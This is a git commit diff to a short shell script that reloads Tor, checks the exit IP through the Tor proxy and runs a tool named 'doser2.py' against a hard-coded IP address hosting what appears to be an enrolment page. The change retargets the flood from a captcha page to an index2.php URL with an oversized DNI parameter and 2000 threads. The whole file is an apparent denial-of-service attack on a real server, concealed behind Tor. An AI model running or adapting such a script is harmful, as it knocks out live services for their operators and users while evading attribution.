583c1e0647a64907ee5052505775eb258ff60e9f
padronrucsunat <162722176+padronrucsunat@users.noreply.github.com>
2024-03-10 14:30:52 -0500

    Update unaj25.sh

--- unaj25.sh
+++ unaj25.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 service tor reload &>/dev/null
 curl --socks5 127.0.0.1:9050 ip.p3terx.com
-python3 doser2.py -g 'http://167.172.229.66/proceso-inscripcion/capcha.php' -t 10000
+python3 doser2.py -g 'http://167.172.229.66/proceso-inscripcion/index2.php?dni=79999999999999999999999&est=1&formdoc=D.N.I.' -t 2000
